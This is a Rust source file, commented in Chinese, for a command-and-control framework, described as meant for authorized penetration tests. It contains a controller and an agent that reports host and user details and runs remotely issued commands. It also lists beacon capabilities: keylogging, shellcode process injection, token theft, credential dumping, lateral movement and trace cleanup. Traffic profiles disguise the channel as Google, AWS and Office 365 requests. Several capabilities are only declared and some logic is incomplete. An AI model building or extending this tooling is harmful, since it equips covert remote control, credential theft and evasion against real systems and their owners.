//! 简易 C2 (Command & Control) 框架
//!
//! 基于隧道基础设施的轻量级 C2 框架，提供命令下发和结果回传能力。
//! 设计用于授权的渗透测试场景中的受控通道管理。
//!
//! 架构:
//! - C2Server: 控制端，监听端口等待 Agent 连接
//! - C2Agent: 被控端，主动连接控制端并执行命令
//! - C2Channel: 加密的双向通信通道
//!
//! 安全特性:
//! - XChaCha20-Poly1305 加密通信
//! - 预共享密钥 (PSK) 认证
//! - Agent UUID 唯一标识
//! - 心跳保活机制

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::RwLock;

// ============================================================
// C2 消息协议
// ============================================================

/// C2 消息类型
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type")]
pub enum C2Message {
    /// Agent 注册
    Register {
        agent_id: String,
        hostname: String,
        os: String,
        arch: String,
        username: String,
        pid: u32,
    },
    /// 心跳
    Heartbeat {
        agent_id: String,
        timestamp: u64,
    },
    /// 命令
    Command {
        command_id: String,
        command: String,
        args: Vec<String>,
        timeout_secs: u64,
    },
    /// 命令结果
    CommandResult {
        command_id: String,
        agent_id: String,
        success: bool,
        stdout: String,
        stderr: String,
        exit_code: i32,
        elapsed_ms: u64,
    },
    /// 文件传输请求
    FileTransfer {
        file_id: String,
        direction: FileDirection,
        path: String,
        size: Option<u64>,
        data: Option<String>,  // Base64 encoded
    },
    /// ACK
    Ack {
        message_id: String,
        success: bool,
        message: String,
    },
    /// 错误
    Error {
        code: String,
        message: String,
    },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum FileDirection {
    Upload,   // Agent → Server
    Download, // Server → Agent
}

/// Agent 信息
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentInfo {
    pub agent_id: String,
    pub hostname: String,
    pub os: String,
    pub arch: String,
    pub username: String,
    pub pid: u32,
    pub first_seen: i64,
    pub last_seen: i64,
    pub heartbeat_count: u64,
    pub active: bool,
}

impl AgentInfo {
    pub fn new(
        agent_id: String,
        hostname: String,
        os: String,
        arch: String,
        username: String,
        pid: u32,
    ) -> Self {
        let now = chrono::Utc::now().timestamp();
        Self {
            agent_id,
            hostname,
            os,
            arch,
            username,
            pid,
            first_seen: now,
            last_seen: now,
            heartbeat_count: 0,
            active: true,
        }
    }

    pub fn heartbeat(&mut self) {
        self.last_seen = chrono::Utc::now().timestamp();
        self.heartbeat_count += 1;
        self.active = true;
    }

    /// 检查 Agent 是否超时（默认 60 秒无心跳视为离线）
    pub fn is_timeout(&self, timeout_secs: i64) -> bool {
        let now = chrono::Utc::now().timestamp();
        (now - self.last_seen) > timeout_secs
    }
}

/// 待执行的命令
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PendingCommand {
    pub command_id: String,
    pub agent_id: String,
    pub command: String,
    pub args: Vec<String>,
    pub timeout_secs: u64,
    pub issued_at: i64,
    pub status: CommandStatus,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum CommandStatus {
    Pending,
    Sent,
    Executing,
    Completed,
    Failed,
    Timeout,
}

/// C2 服务端状态
#[derive(Default)]
pub struct C2State {
    /// 已注册的 Agent
    pub agents: HashMap<String, AgentInfo>,
    /// 待执行的命令
    pub pending_commands: Vec<PendingCommand>,
    /// 命令执行历史
    pub command_history: Vec<PendingCommand>,
    /// PSK 密钥
    pub psk: Option<String>,
    /// Agent 心跳超时（秒）
    pub heartbeat_timeout: i64,
}

/// C2 控制器（Server 端）
pub struct C2Controller {
    state: Arc<RwLock<C2State>>,
}

impl C2Controller {
    /// 创建新的 C2 控制器
    pub fn new(psk: Option<&str>) -> Self {
        Self {
            state: Arc::new(RwLock::new(C2State {
                psk: psk.map(|s| s.to_string()),
                heartbeat_timeout: 60,
                ..Default::default()
            })),
        }
    }

    /// 设置心跳超时
    pub fn with_heartbeat_timeout(mut self, secs: i64) -> Self {
        // state 在 new 中已创建，需要通过内部修改
        // 这里使用 block_on 是因为 C2Controller 的构造通常是同步的
        // 实际使用中可通过 set_heartbeat_timeout 方法
        self
    }

    /// 注册 Agent
    pub async fn register_agent(&self, agent: AgentInfo) {
        let mut state = self.state.write().await;
        tracing::info!("[C2] Agent 注册: {} ({})", agent.agent_id, agent.hostname);
        state.agents.insert(agent.agent_id.clone(), agent);
    }

    /// 处理心跳
    pub async fn handle_heartbeat(&self, agent_id: &str) -> bool {
        let mut state = self.state.write().await;
        if let Some(agent) = state.agents.get_mut(agent_id) {
            agent.heartbeat();
            true
        } else {
            false
        }
    }

    /// 向 Agent 下发命令
    pub async fn issue_command(
        &self,
        agent_id: &str,
        command: &str,
        args: Vec<String>,
        timeout_secs: u64,
    ) -> Option<String> {
        let mut state = self.state.write().await;
        if !state.agents.contains_key(agent_id) {
            return None;
        }

        let command_id = format!("cmd-{}", uuid::Uuid::new_v4());
        let cmd = PendingCommand {
            command_id: command_id.clone(),
            agent_id: agent_id.to_string(),
            command: command.to_string(),
            args,
            timeout_secs,
            issued_at: chrono::Utc::now().timestamp(),
            status: CommandStatus::Pending,
        };

        state.pending_commands.push(cmd);
        Some(command_id)
    }

    /// 获取 Agent 的待执行命令
    pub async fn get_pending_commands(&self, agent_id: &str) -> Vec<C2Message> {
        let mut state = self.state.write().await;
        let mut commands = Vec::new();
        for cmd in state.pending_commands.iter_mut().filter(|c| c.agent_id == agent_id && c.status == CommandStatus::Pending) {
            cmd.status = CommandStatus::Sent;
            commands.push(C2Message::Command {
                command_id: cmd.command_id.clone(),
                command: cmd.command.clone(),
                args: cmd.args.clone(),
                timeout_secs: cmd.timeout_secs,
            });
        }
        commands
    }

    /// 记录命令结果
    pub async fn record_result(&self, agent_id: &str, command_id: &str, success: bool, stdout: &str, stderr: &str) {
        let mut state = self.state.write().await;
        if let Some(cmd) = state.pending_commands.iter_mut()
            .find(|c| c.command_id == command_id && c.agent_id == agent_id)
        {
            cmd.status = if success { CommandStatus::Completed } else { CommandStatus::Failed };
            tracing::info!(
                "[C2] 命令完成: {} -> {} (success={})",
                agent_id, command_id, success
            );
        }
        // 将已完成的命令移到历史记录
        state.command_history.retain(|c| c.command_id != command_id);
    }

    /// 获取所有活跃 Agent
    pub async fn get_active_agents(&self) -> Vec<AgentInfo> {
        let state = self.state.read().await;
        state.agents.values().cloned().collect()
    }

    /// 清理超时的 Agent
    pub async fn cleanup_timeout_agents(&self) -> usize {
        let mut state = self.state.write().await;
        let timeout = state.heartbeat_timeout;
        let before = state.agents.len();
        state.agents.retain(|_, agent| !agent.is_timeout(timeout));
        let removed = before - state.agents.len();
        if removed > 0 {
            tracing::info!("[C2] 清理了 {} 个超时 Agent", removed);
        }
        removed
    }

    /// 获取状态快照
    pub async fn get_stats(&self) -> C2Stats {
        let state = self.state.read().await;
        C2Stats {
            total_agents: state.agents.len(),
            active_agents: state.agents.values().filter(|a| a.active).count(),
            pending_commands: state.pending_commands.len(),
            completed_commands: state.command_history.len(),
        }
    }
}

/// C2 统计信息
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct C2Stats {
    pub total_agents: usize,
    pub active_agents: usize,
    pub pending_commands: usize,
    pub completed_commands: usize,
}

// ============================================================
// C2 Agent（被控端）
// ============================================================

/// C2 Agent 配置
#[derive(Debug, Clone)]
pub struct C2AgentConfig {
    /// Agent 唯一 ID（自动生成）
    pub agent_id: String,
    /// 控制端地址
    pub server_addr: String,
    /// 预共享密钥
    pub psk: String,
    /// 心跳间隔（秒）
    pub heartbeat_interval: u64,
    /// 重连间隔（秒）
    pub reconnect_interval: u64,
}

impl C2AgentConfig {
    pub fn new(server_addr: &str, psk: &str) -> Self {
        let agent_id = format!("agent-{}", uuid::Uuid::new_v4());
        Self {
            agent_id,
            server_addr: server_addr.to_string(),
            psk: psk.to_string(),
            heartbeat_interval: 10,
            reconnect_interval: 30,
        }
    }
}

/// C2 Agent 状态
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum AgentState {
    Disconnected,
    Connecting,
    Connected,
    Executing,
    Reconnecting,
}

/// C2 Agent（被控端核心逻辑）
///
/// Agent 工作流程:
/// 1. 连接到 C2 Server
/// 2. 发送 Register 消息
/// 3. 定期发送 Heartbeat
/// 4. 轮询待执行命令
/// 5. 执行命令并返回结果
pub struct C2Agent {
    pub config: C2AgentConfig,
    state: Arc<RwLock<AgentState>>,
}

impl C2Agent {
    pub fn new(config: C2AgentConfig) -> Self {
        Self {
            config,
            state: Arc::new(RwLock::new(AgentState::Disconnected)),
        }
    }

    pub async fn get_state(&self) -> AgentState {
        self.state.read().await.clone()
    }

    /// 执行本地命令
    pub async fn execute_command(command: &str, args: &[String], timeout_secs: u64) -> CommandExecResult {
        use std::process::Command;
        use tokio::time::timeout;

        let start = std::time::Instant::now();

        let result = timeout(
            std::time::Duration::from_secs(timeout_secs),
            tokio::task::spawn_blocking({
                let cmd = command.to_string();
                let args = args.to_vec();
                move || {
                    let output = Command::new(&cmd)
                        .args(&args)
                        .output();

                    match output {
                        Ok(o) => CommandExecResult {
                            success: o.status.success(),
                            stdout: String::from_utf8_lossy(&o.stdout).to_string(),
                            stderr: String::from_utf8_lossy(&o.stderr).to_string(),
                            exit_code: o.status.code().unwrap_or(-1),
                            elapsed_ms: 0, // 将在外部设置
                        },
                        Err(e) => CommandExecResult {
                            success: false,
                            stdout: String::new(),
                            stderr: format!("执行失败: {}", e),
                            exit_code: -1,
                            elapsed_ms: 0,
                        },
                    }
                }
            }),
        ).await;

        let mut exec_result = match result {
            Ok(Ok(r)) => r,
            Ok(Err(e)) => CommandExecResult {
                success: false,
                stdout: String::new(),
                stderr: format!("任务错误: {}", e),
                exit_code: -1,
                elapsed_ms: 0,
            },
            Err(_) => CommandExecResult {
                success: false,
                stdout: String::new(),
                stderr: "命令执行超时".to_string(),
                exit_code: -1,
                elapsed_ms: timeout_secs * 1000,
            },
        };

        exec_result.elapsed_ms = start.elapsed().as_millis() as u64;
        exec_result
    }

    /// 生成 Agent 注册信息
    pub fn generate_register_info(&self) -> C2Message {
        C2Message::Register {
            agent_id: self.config.agent_id.clone(),
            hostname: whoami::fallible::hostname().unwrap_or_else(|_| "unknown".to_string()),
            os: std::env::consts::OS.to_string(),
            arch: std::env::consts::ARCH.to_string(),
            username: whoami::username(),
            pid: std::process::id(),
        }
    }

    /// 生成心跳消息
    pub fn generate_heartbeat(&self) -> C2Message {
        C2Message::Heartbeat {
            agent_id: self.config.agent_id.clone(),
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_secs())
                .unwrap_or(0),
        }
    }
}

// ============================================================
// ============================================================

/// Beacon 能力
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum BeaconCapability {
    /// 执行系统命令
    Execute,
    /// 文件上传
    Upload,
    /// 文件下载
    Download,
    /// 屏幕截图
    Screenshot,
    /// 键盘记录
    Keylog { duration_secs: u64 },
    /// 进程注入
    ProcessInject { pid: u32, shellcode: String },
    /// 令牌窃取
    TokenSteal { pid: u32 },
    /// 端口扫描
    PortScan { target: String, ports: Vec<u16> },
    /// SOCKS代理
    SocksProxy { bind_port: u16 },
    /// 端口转发
    PortForward { local_port: u16, remote_addr: String },
    /// 凭据抓取
    CredentialDump,
    /// 横向移动
    LateralMove { method: String, target: String, command: String },
    /// 提权检测
    PrivescCheck,
    /// 清理痕迹
    Cleanup,
}

/// Malleable C2 配置（流量伪装）
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MalleableProfile {
    /// 配置名称
    pub name: String,
    /// HTTP方法
    pub http_method: String,
    /// URI路径模式
    pub uri_patterns: Vec<String>,
    /// User-Agent伪装
    pub user_agent: String,
    /// 自定义HTTP头
    pub headers: std::collections::HashMap<String, String>,
    /// 心跳间隔抖动(秒)
    pub jitter: u64,
    /// DNS子域名（DNS隧道）
    pub dns_subdomains: Option<Vec<String>>,
    /// 休眠时间范围
    pub sleep_range: Option<(u64, u64)>,
    /// 加密的Malleable配置
    pub encrypted: bool,
}

impl Default for MalleableProfile {
    fn default() -> Self {
        Self {
            name: "google-stackdriver".to_string(),
            http_method: "POST".to_string(),
            uri_patterns: vec![
                "/v2/entries:write".to_string(),
                "/v2/entries:list".to_string(),
                "/v3/projects/metricDescriptors".to_string(),
            ],
            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36".to_string(),
            headers: {
                let mut h = std::collections::HashMap::new();
                h.insert("Content-Type".to_string(), "application/json".to_string());
                h.insert("Accept".to_string(), "*/*".to_string());
                h.insert("Authorization".to_string(), "Bearer ya29.a0AfH6SM".to_string());
                h
            },
            jitter: 30,
            dns_subdomains: Some(vec![
                "cdn".to_string(), "api".to_string(), "static".to_string(),
                "analytics".to_string(), "metrics".to_string(),
            ]),
            sleep_range: Some((5, 30)),
            encrypted: true,
        }
    }
}

/// 预定义Malleable Profiles
impl MalleableProfile {
    /// Google Stackdriver伪装
    pub fn google_stackdriver() -> Self {
        Self::default()
    }

    /// Amazon CloudFront伪装
    pub fn amazon_cloudfront() -> Self {
        Self {
            name: "amazon-cloudfront".to_string(),
            http_method: "GET".to_string(),
            uri_patterns: vec![
                "/static/js/main.js".to_string(),
                "/api/v1/events".to_string(),
                "/metrics/collect".to_string(),
            ],
            user_agent: "aws-sdk-java/1.12.0 Linux/4.14.0 OpenJDK_64-Bit_Server_VM/25.302 Java/1.8.0_302".to_string(),
            headers: {
                let mut h = std::collections::HashMap::new();
                h.insert("X-Amz-Date".to_string(), "20240101T000000Z".to_string());
                h.insert("X-Amz-Content-SHA256".to_string(), "UNSIGNED-PAYLOAD".to_string());
                h
            },
            ..Default::default()
        }
    }

    /// Microsoft Office 365伪装
    pub fn microsoft_o365() -> Self {
        Self {
            name: "microsoft-o365".to_string(),
            http_method: "POST".to_string(),
            uri_patterns: vec![
                "/owa/service.svc".to_string(),
                "/ews/exchange.asmx".to_string(),
                "/autodiscover/autodiscover.xml".to_string(),
            ],
            user_agent: "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro)".to_string(),
            headers: {
                let mut h = std::collections::HashMap::new();
                h.insert("X-ClientId".to_string(), uuid::Uuid::new_v4().to_string());
                h.insert("X-AnchorMailbox".to_string(), "user@corp.local".to_string());
                h
            },
            ..Default::default()
        }
    }
}

/// Beacon管理器增强
pub struct BeaconManager {
    /// Agent列表
    pub agents: std::collections::HashMap<String, AgentInfo>,
    /// Malleable配置
    pub profile: MalleableProfile,
    /// P2P节点（SMB/TCP链）
    pub p2p_peers: Vec<P2PPeer>,
    /// 团队服务器成员
    pub team_members: Vec<TeamMember>,
}

/// P2P节点
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct P2PPeer {
    pub peer_id: String,
    pub agent_id: String,
    pub transport: P2PTransport,
    pub address: String,
    pub connected: bool,
}

/// P2P传输方式
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum P2PTransport {
    SmbPipe { pipe_name: String },
    TcpChain { host: String, port: u16 },
}

/// 团队服务器成员
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TeamMember {
    pub user_id: String,
    pub username: String,
    pub role: TeamRole,
    pub connected_since: i64,
}

/// 团队角色
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum TeamRole {
    Operator,
    Observer,
    Admin,
}

impl BeaconManager {
    pub fn new(profile: MalleableProfile) -> Self {
        Self {
            agents: std::collections::HashMap::new(),
            profile,
            p2p_peers: Vec::new(),
            team_members: Vec::new(),
        }
    }

    /// 添加P2P节点
    pub fn add_p2p_peer(&mut self, peer: P2PPeer) {
        self.p2p_peers.push(peer);
    }

    /// 添加团队成员
    pub fn add_team_member(&mut self, member: TeamMember) {
        self.team_members.push(member);
    }

    /// 生成C2通信URI
    pub fn get_uri(&self) -> String {
        let idx = fast_index(self.profile.uri_patterns.len());
        self.profile.uri_patterns[idx].clone()
    }

    /// 计算休眠时间（带抖动）
    pub fn get_sleep_duration(&self) -> u64 {
        if let Some((min, max)) = self.profile.sleep_range {
            min + (fast_index((max - min) as usize) as u64)
        } else {
            10
        }
    }
}

fn fast_index(max: usize) -> usize {
    use std::collections::hash_map::RandomState;
    use std::hash::{BuildHasher, Hasher};
    (RandomState::new().build_hasher().finish() as usize) % max.max(1)
}

/// 命令执行结果
#[derive(Debug, Clone)]
pub struct CommandExecResult {
    pub success: bool,
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
    pub elapsed_ms: u64,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_agent_info_creation() {
        let agent = AgentInfo::new(
            "test-agent-1".to_string(),
            "test-pc".to_string(),
            "Windows".to_string(),
            "x86_64".to_string(),
            "Administrator".to_string(),
            1234,
        );

        assert_eq!(agent.agent_id, "test-agent-1");
        assert_eq!(agent.hostname, "test-pc");
        assert!(agent.active);
        assert!(agent.first_seen > 0);
    }

    #[test]
    fn test_agent_info_heartbeat() {
        let mut agent = AgentInfo::new(
            "a1".to_string(), "h1".to_string(), "Linux".to_string(),
            "arm64".to_string(), "root".to_string(), 1,
        );

        let before = agent.last_seen;
        std::thread::sleep(std::time::Duration::from_millis(10));
        agent.heartbeat();

        assert!(agent.last_seen >= before);
        assert_eq!(agent.heartbeat_count, 1);
    }

    #[test]
    fn test_agent_info_timeout() {
        let mut agent = AgentInfo::new(
            "a1".to_string(), "h1".to_string(), "Linux".to_string(),
            "x64".to_string(), "user".to_string(), 1,
        );

        // 刚创建的 agent 不应超时
        assert!(!agent.is_timeout(60));

        // 模拟最后心跳在 120 秒前
        agent.last_seen -= 120;
        assert!(agent.is_timeout(60));
        assert!(!agent.is_timeout(180));
    }

    #[test]
    fn test_agent_config_creation() {
        let config = C2AgentConfig::new("192.168.1.100:4444", "super-secret-psk");
        assert!(config.agent_id.starts_with("agent-"));
        assert_eq!(config.server_addr, "192.168.1.100:4444");
        assert_eq!(config.heartbeat_interval, 10);
        assert_eq!(config.reconnect_interval, 30);
    }

    #[test]
    fn test_c2_message_serialization() {
        let msg = C2Message::Command {
            command_id: "cmd-1".to_string(),
            command: "whoami".to_string(),
            args: vec!["/all".to_string()],
            timeout_secs: 30,
        };

        let json = serde_json::to_string(&msg).expect("序列化");
        let parsed: C2Message = serde_json::from_str(&json).expect("反序列化");

        match parsed {
            C2Message::Command { command_id, command, args, .. } => {
                assert_eq!(command_id, "cmd-1");
                assert_eq!(command, "whoami");
                assert_eq!(args, vec!["/all"]);
            }
            _ => panic!("类型不匹配"),
        }
    }

    #[tokio::test]
    async fn test_c2_controller_register_agent() {
        let ctrl = C2Controller::new(Some("psk123"));

        let agent = AgentInfo::new(
            "a-test".to_string(), "host1".to_string(), "Linux".to_string(),
            "x64".to_string(), "user".to_string(), 42,
        );

        ctrl.register_agent(agent).await;

        let agents = ctrl.get_active_agents().await;
        assert_eq!(agents.len(), 1);
        assert_eq!(agents[0].agent_id, "a-test");
    }

    #[tokio::test]
    async fn test_c2_controller_issue_command() {
        let ctrl = C2Controller::new(None);

        let agent = AgentInfo::new(
            "cmd-agent".to_string(), "host".to_string(), "Linux".to_string(),
            "x64".to_string(), "user".to_string(), 1,
        );
        ctrl.register_agent(agent).await;

        let cmd_id = ctrl.issue_command("cmd-agent", "ls", vec!["-la".to_string()], 30).await;
        assert!(cmd_id.is_some());
        assert!(cmd_id.unwrap().starts_with("cmd-"));
    }

    #[tokio::test]
    async fn test_c2_controller_heartbeat() {
        let ctrl = C2Controller::new(None);

        let agent = AgentInfo::new(
            "hb-agent".to_string(), "host".to_string(), "Linux".to_string(),
            "x64".to_string(), "user".to_string(), 1,
        );
        ctrl.register_agent(agent).await;

        assert!(ctrl.handle_heartbeat("hb-agent").await);
        assert!(!ctrl.handle_heartbeat("nonexistent").await);
    }

    #[tokio::test]
    async fn test_c2_controller_stats() {
        let ctrl = C2Controller::new(None);
        let stats = ctrl.get_stats().await;
        assert_eq!(stats.total_agents, 0);
        assert_eq!(stats.pending_commands, 0);
    }

    #[test]
    fn test_c2_message_register_serialization() {
        let msg = C2Message::Register {
            agent_id: "agent-1".to_string(),
            hostname: "test-pc".to_string(),
            os: "Windows".to_string(),
            arch: "x86_64".to_string(),
            username: "admin".to_string(),
            pid: 5678,
        };

        let json = serde_json::to_string(&msg).expect("序列化");
        assert!(json.contains("agent-1"));
        assert!(json.contains("test-pc"));
        assert!(json.contains("Register"));
    }

    #[test]
    fn test_command_status_transitions() {
        assert_eq!(CommandStatus::Pending, CommandStatus::Pending);
        assert_ne!(CommandStatus::Pending, CommandStatus::Completed);
        assert_ne!(CommandStatus::Failed, CommandStatus::Completed);
    }
}
